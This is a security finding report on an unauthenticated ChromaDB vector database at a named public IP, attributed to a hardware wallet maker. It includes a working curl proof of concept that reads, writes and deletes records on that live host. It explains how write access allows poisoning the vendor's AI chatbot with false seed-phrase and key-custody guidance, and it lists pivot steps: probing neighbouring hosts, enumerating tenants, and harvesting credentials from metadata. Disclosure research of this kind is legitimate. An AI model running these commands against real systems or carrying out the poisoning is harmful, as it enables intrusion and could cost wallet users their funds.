# Keystone Hardware Wallet -- Unauth RWD on ChromaDB AI Knowledge Base

**Date:** 2026-06-20
**Tool:** chromascan
**Severity:** CRITICAL
**Status:** CONFIRMED -- unauth read + write + delete

---

## Target

| Field | Value |
|-------|-------|
| IP | 43.153.169.169 |
| Port | 8000 |
| Service | ChromaDB |
| Version | 1.0.0 |
| API | v2 (multi-tenant) |
| Hosting | Tencent Cloud |
| Auth | NONE |

---

## Operator Attribution

**Keystone** -- keyst.one -- hardware cryptocurrency wallet manufacturer

Evidence:
- Collection names `keystone_article_style` and `keystone_knowledge_base`
- Content explicitly references "Keystone" hardware wallet product line
- Source URLs in embedded metadata include `blog.keyst.one`
- Content covers Keystone-specific topics: private key custody, multisig wallets, blind signing, HNSW index configuration

---

## Data

**2 collections, 6,907 total records**

| Collection | ID | Records | Dimensions | Content |
|------------|----|---------|------------|---------|
| keystone_article_style | 001c74f8-135d-4455-9ce6-cc096755b649 | 752 | 1024 | Editorial/marketing content on crypto wallet security (Chinese + English) |
| keystone_knowledge_base | (separate UUID) | 6,155 | 1024 | Full product knowledge base: hardware wallet documentation, guides, comparisons |

**Sample -- keystone_article_style:**
- "希望你永远用不到，但若遇到，你已经准备好了。" (Hope you never need it, but if you do, you're ready.)
- "你的私钥，只应该存在于你手中的设备里。「Not your keys, not your coins」在 AI [era]..."
- "彻底攻克盲签问题，是多签钱包安全性的关键突破点" (Blind signing as multisig security breakthrough)

**Sample -- keystone_knowledge_base:**
- Hardware wallet comparison guides (2024)
- "In the rapidly evolving world of cryptocurrency, securing digital assets is of paramount importance"
- Source URLs referencing `blog.keyst.one`

---

## Access Matrix

| Operation | Result | HTTP |
|-----------|--------|------|
| List tenants | 200 + tenant list | GET /api/v2/tenants |
| List collections | 200 + 2 collections | GET /api/v2/tenants/default_tenant/databases/default_database/collections |
| Read records | 200 + documents + embeddings | POST /api/v2/.../collections/{id}/get |
| Write record | 201 | POST /api/v2/.../collections/{id}/add |
| Delete record | {"deleted": 1} | POST /api/v2/.../collections/{id}/delete |

**Canary UUID:** `nuclide-canary-2026`
**Target collection:** `keystone_article_style` (ID: 001c74f8-135d-4455-9ce6-cc096755b649)

Write confirmed: POST /add with 1024-dim zero vector + document returned HTTP 201.
Delete confirmed: POST /delete {"ids":["nuclide-canary-2026"]} returned {"deleted": 1}.
Verify confirmed: POST /get {"ids":["nuclide-canary-2026"]} returned {"ids": [], "documents": []} -- absent.

**Dimension note:** ChromaDB write requires explicit embedding vector. Operator uses 1024-dim embeddings. Zero vector accepted -- write access does not require the operator's embedding model.

---

## PoC

```bash
BASE="http://43.153.169.169:8000/api/v2/tenants/default_tenant/databases/default_database"
COLL="001c74f8-135d-4455-9ce6-cc096755b649"

# READ -- pull first 10 records from knowledge base
curl -s -X POST "$BASE/collections/$COLL/get" \
  -H "Content-Type: application/json" \
  -d '{"limit": 10, "include": ["documents", "metadatas"]}' | jq .

# WRITE -- inject canary record
curl -s -X POST "$BASE/collections/$COLL/add" \
  -H "Content-Type: application/json" \
  -d '{
    "ids": ["nuclide-canary-2026"],
    "embeddings": ['"$(python3 -c "print('[' + ','.join(['0.0']*1024) + ']')"')'],
    "documents": ["nuclide canary -- proof of write"],
    "metadatas": [{"source": "nuclide-research"}]
  }'

# DELETE -- remove canary
curl -s -X POST "$BASE/collections/$COLL/delete" \
  -H "Content-Type: application/json" \
  -d '{"ids": ["nuclide-canary-2026"]}' | jq .

# VERIFY -- confirm deletion
curl -s -X POST "$BASE/collections/$COLL/get" \
  -H "Content-Type: application/json" \
  -d '{"ids": ["nuclide-canary-2026"]}' | jq .ids
# Expected: []
```

---

## Impact

### Knowledge Base Exfiltration

The full Keystone product knowledge base (6,155 chunks) is readable without authentication. This is the backend for Keystone's AI chatbot or documentation assistant -- the complete internal corpus powering customer-facing AI responses.

### RAG Poisoning -- Financial Harm Vector

Write access to the knowledge base allows injection of false cryptocurrency security guidance. A poisoned record can cause the Keystone chatbot to return incorrect instructions for:
- Backup procedures (seed phrase handling)
- Private key management
- Recovery workflows
- Multisig setup

Keystone's users are protecting cryptocurrency assets. Misinformation about key custody has direct financial consequences -- assets lost, stolen, or locked out.

### Intellectual Property Exposure

`keystone_article_style` contains proprietary editorial framing for Keystone's security marketing content, including Chinese-language crypto security articles under development. Competitor-extractable.

### Blind Signing Content -- Phishing Surface

Content explicitly covers multisig wallet security and blind signing vulnerabilities. Poisoned guidance on these topics is high-value material for phishing campaigns targeting hardware wallet users.

---

## Pivot Avenues

1. **keyst.one** -- identify the AI chatbot or documentation assistant that queries this ChromaDB instance; the poisoning surface is the user-facing interface
2. **Tencent Cloud neighborhood (43.153.169.0/24)** -- this IP is likely part of a larger Keystone backend; probe adjacent hosts for additional AI/API services
3. **Cross-tenant access** -- ChromaDB v2 multi-tenant headers (`x-chroma-tenant`, `x-chroma-database`) are exposed in CORS; enumerate whether additional tenants exist beyond `default_tenant`
4. **keystone_knowledge_base full scroll** -- 6,155 records; pull with pagination to map complete documentation corpus and identify any embedded credentials, API keys, or internal URL references in metadata
5. **Embedding model inference** -- 1024-dim vectors match models like `text-embedding-3-large` (OpenAI) or `nomic-embed-text-v1.5`; if OpenAI is the upstream, probe for API key exposure in any adjacent config surface
6. **Blog.keyst.one source URLs** -- metadata contains source references; pull unique sources to enumerate the complete content pipeline feeding this knowledge base

---

## Tool Reference

**chromascan** -- unauthenticated ChromaDB enumeration + canary write/delete verification
https://github.com/nuclide-research/chromascan
